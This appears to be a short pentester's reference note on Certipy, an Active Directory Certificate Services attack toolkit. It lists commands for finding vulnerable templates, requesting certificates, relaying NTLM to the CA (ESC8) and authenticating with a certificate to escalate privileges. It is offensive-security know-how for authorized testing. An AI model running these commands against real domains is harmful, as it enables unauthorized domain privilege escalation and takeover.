---
tags: [tool, activedirectory, certificate]
tool: "certipy"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# Certipy - AD CS Attack Toolkit

## Tool Overview
Purpose: AD CS enumeration and exploitation (ESC1-ESC8)
Location: /usr/bin/certipy

## When to Use
- Finding vulnerable certificate templates
- Requesting certificates
- AD CS privilege escalation

## How to Use It

Find Vulnerable Templates:
certipy find -u user@domain.local -p pass -dc-ip 10.10.10.100

Request Certificate:
certipy req -u user@domain.local -p pass -ca CA-SERVER -template VulnTemplate -target dc.domain.local

ESC8 - Relay to CA:
certipy relay -ca ca-server -template DomainController

Authenticate with Certificate:
certipy auth -pfx user.pfx -dc-ip 10.10.10.100

## ESC Scenarios
- ESC1: Domain escalation via certificate
- ESC2/ESC3: Template misconfigurations
- ESC4: Access control vulnerabilities
- ESC8: NTLM relay to AD CS

## Related Tools
certify, pkinit-tools
